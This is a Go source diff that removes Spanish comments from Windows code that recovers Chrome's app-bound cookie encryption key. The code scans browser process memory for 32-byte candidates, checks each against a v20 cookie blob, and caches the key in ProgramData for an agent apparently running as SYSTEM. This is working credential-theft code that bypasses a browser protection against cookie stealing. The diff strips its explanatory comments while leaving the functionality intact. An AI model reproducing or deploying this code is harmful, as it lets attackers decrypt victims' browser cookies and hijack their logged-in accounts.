@@ -16,20 +16,10 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// Chrome 127+ cifra las cookies con una clave app-bound (prefijo v20) que solo
-// entrega su servicio de elevación, y lo hace solo a chrome.exe firmado. La
-// clave no se puede desenvolver en disco: el blob de Local State acaba en un
-// material de 133 bytes que el servicio descifra con su propio secreto.
-//
-// Lo que sí se puede hacer es leerla de la memoria del navegador, que la
-// mantiene mientras tiene la base de cookies abierta. GCM autentica, así que
-// probar cada ventana de 32 bytes contra un blob real no da falsos positivos:
-// la primera que abre es la clave.
-
 const (
 	memPrivate       = 0x20000
 	memMapped        = 0x40000
-	maxScanBytes     = 2 << 30 // 2 GB: un navegador normal no llega ahí
+	maxScanBytes     = 2 << 30
 	maxScanDuration  = 90 * time.Second
 	scanChunk        = 16 << 20
 	appBoundKeyBytes = 32
@@ -42,9 +32,6 @@ var (
 	appBoundCache = map[string][]byte{}
 )
 
-// firstAppBound devuelve el primer blob v20 de las filas, que sirve de muestra
-// para validar una clave candidata: GCM autentica, así que solo la clave real
-// lo abre.
 func firstAppBound(rows [][]SQLiteValue, blobIndex int) []byte {
 	for _, row := range rows {
 		if len(row) <= blobIndex {
@@ -58,10 +45,6 @@ func firstAppBound(rows [][]SQLiteValue, blobIndex int) []byte {
 	return nil
 }
 
-// AppBoundKey devuelve la clave app-bound de un navegador para el blob de
-// muestra. La clave es estable por instalación: se guarda en disco y se
-// reutiliza. El blob de muestra es la prueba —GCM autentica—, así que una clave
-// vieja se descarta sola y se vuelve a barrer la memoria del navegador.
 func AppBoundKey(browser string, sample []byte) ([]byte, error) {
 	appBoundMu.Lock()
 	defer appBoundMu.Unlock()
@@ -87,8 +70,6 @@ func AppBoundKey(browser string, sample []byte) ([]byte, error) {
 	return key, nil
 }
 
-// browserProcessName traduce el nombre del navegador al del ejecutable que
-// mantiene la clave en memoria.
 func browserProcessName(browser string) string {
 	lower := strings.ToLower(browser)
 	switch {
@@ -107,9 +88,6 @@ func browserProcessName(browser string) string {
 	}
 }
 
-// appBoundKeyPath es donde se guarda la clave ya recuperada. Vive en ProgramData
-// porque el agente corre como SYSTEM y el barrido de memoria tiene que hacerse
-// una sola vez por navegador.
 func appBoundKeyPath(browser string) string {
 	base := os.Getenv("ProgramData")
 	if base == "" {
@@ -119,8 +97,6 @@ func appBoundKeyPath(browser string) string {
 	return filepath.Join(base, config.DataDirName, name)
 }
 
-// loadAppBoundKey lee la clave guardada y la valida contra el blob de muestra.
-// Una clave de otra instalación no abre y se descarta.
 func loadAppBoundKey(browser string, sample []byte) []byte {
 	raw, err := os.ReadFile(appBoundKeyPath(browser))
 	if err != nil || len(raw) != appBoundKeyBytes {
@@ -134,8 +110,6 @@ func loadAppBoundKey(browser string, sample []byte) []byte {
 	return key
 }
 
-// saveAppBoundKey deja la clave en disco para no repetir el barrido de memoria.
-// Si falla no es un error: solo cuesta volver a buscarla.
 func saveAppBoundKey(browser string, key []byte) {
 	path := appBoundKeyPath(browser)
 	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
@@ -144,8 +118,6 @@ func saveAppBoundKey(browser string, key []byte) {
 	_ = os.WriteFile(path, key, 0o600)
 }
 
-// RecoverAppBoundKey busca en la memoria de los procesos del navegador la clave
-// que abre el blob v20 dado. Devuelve la clave de 32 bytes.
 func RecoverAppBoundKey(browser string, sample []byte) ([]byte, error) {
 	if len(sample) < 3+12+16 || string(sample[:3]) != "v20" {
 		return nil, errors.New("chrome: se necesita un blob v20 para buscar la clave")
@@ -191,8 +163,6 @@ func RecoverAppBoundKey(browser string, sample []byte) ([]byte, error) {
 	return nil, errors.New("chrome: clave app-bound no encontrada en memoria")
 }
 
-// scanProcessForKey recorre las regiones privadas legibles del proceso y prueba
-// cada ventana alineada de 32 bytes contra el blob.
 func scanProcessForKey(process windows.Handle, sample []byte, deadline time.Time) ([]byte, int64, error) {
 	var info windows.MemoryBasicInformation
 	var address uintptr
